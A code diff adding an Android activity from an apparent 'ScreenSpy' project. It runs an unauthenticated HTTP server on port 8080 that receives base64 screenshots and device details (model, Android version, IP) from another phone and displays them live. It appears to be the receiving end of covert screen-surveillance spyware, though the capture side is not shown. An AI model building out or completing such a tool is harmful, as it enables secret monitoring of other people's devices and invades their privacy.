@@ -1,0 +1,156 @@
+package com.screenspy.receiver;
+
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.os.Bundle;
+import android.os.Handler;
+import android.util.Base64;
+import android.util.Log;
+import android.widget.ImageView;
+import android.widget.TextView;
+import androidx.appcompat.app.AppCompatActivity;
+import org.json.JSONObject;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.ServerSocket;
+import java.net.Socket;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
+
+public class ReceiverActivity extends AppCompatActivity {
+    
+    private ImageView screenView;
+    private TextView deviceInfoText;
+    private TextView statusText;
+    private TextView timestampText;
+    
+    private ServerSocket serverSocket;
+    private Handler handler = new Handler();
+    private boolean isRunning = false;
+    private int serverPort = 8080;
+    
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_receiver);
+        
+        screenView = findViewById(R.id.screenView);
+        deviceInfoText = findViewById(R.id.deviceInfoText);
+        statusText = findViewById(R.id.statusText);
+        timestampText = findViewById(R.id.timestampText);
+        
+        // Start receiver server
+        startReceiverServer();
+    }
+    
+    private void startReceiverServer() {
+        new Thread(() -> {
+            try {
+                serverSocket = new ServerSocket(serverPort);
+                isRunning = true;
+                
+                updateStatus("🟢 Server aktif di port " + serverPort);
+                
+                while (isRunning) {
+                    Socket clientSocket = serverSocket.accept();
+                    handleClient(clientSocket);
+                }
+                
+            } catch (Exception e) {
+                updateStatus("🔴 Server error: " + e.getMessage());
+                Log.e("ScreenSpy", "Server error: " + e);
+            }
+        }).start();
+    }
+    
+    private void handleClient(Socket clientSocket) {
+        try {
+            BufferedReader reader = new BufferedReader(
+                new InputStreamReader(clientSocket.getInputStream())
+            );
+            
+            StringBuilder request = new StringBuilder();
+            String line;
+            
+            // Read HTTP request
+            while ((line = reader.readLine()) != null && !line.isEmpty()) {
+                request.append(line).append("\n");
+            }
+            
+            // Read JSON body if present
+            StringBuilder body = new StringBuilder();
+            while (reader.ready()) {
+                body.append((char) reader.read());
+            }
+            
+            // Process screen data
+            if (body.length() > 0) {
+                processScreenData(body.toString());
+            }
+            
+            // Send response
+            String response = "HTTP/1.1 200 OK\r\n\r\nOK";
+            clientSocket.getOutputStream().write(response.getBytes());
+            
+            clientSocket.close();
+            
+        } catch (Exception e) {
+            Log.e("ScreenSpy", "Client error: " + e);
+        }
+    }
+    
+    private void processScreenData(String jsonData) {
+        try {
+            JSONObject json = new JSONObject(jsonData);
+            
+            String base64Image = json.getString("image");
+            JSONObject deviceInfo = json.getJSONObject("device");
+            long timestamp = json.getLong("timestamp");
+            
+            // Convert base64 to bitmap
+            byte[] imageBytes = Base64.decode(base64Image, Base64.DEFAULT);
+            final Bitmap bitmap = BitmapFactory.decodeByteArray(imageBytes, 0, imageBytes.length);
+            
+            // Format device info
+            String deviceText = String.format(
+                "📱 %s\n⚙️ Android %s\n🌐 %s",
+                deviceInfo.getString("model"),
+                deviceInfo.getString("android"),
+                deviceInfo.getString("ip")
+            );
+            
+            // Format timestamp
+            String timeText = new SimpleDateFormat("HH:mm:ss", Locale.getDefault())
+                .format(new Date(timestamp));
+            
+            // Update UI on main thread
+            handler.post(() -> {
+                screenView.setImageBitmap(bitmap);
+                deviceInfoText.setText(deviceText);
+                timestampText.setText("🕒 " + timeText);
+                statusText.setText("✅ Screen received");
+            });
+            
+        } catch (Exception e) {
+            Log.e("ScreenSpy", "Process error: " + e);
+        }
+    }
+    
+    private void updateStatus(final String message) {
+        handler.post(() -> statusText.setText(message));
+    }
+    
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        isRunning = false;
+        try {
+            if (serverSocket != null) {
+                serverSocket.close();
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
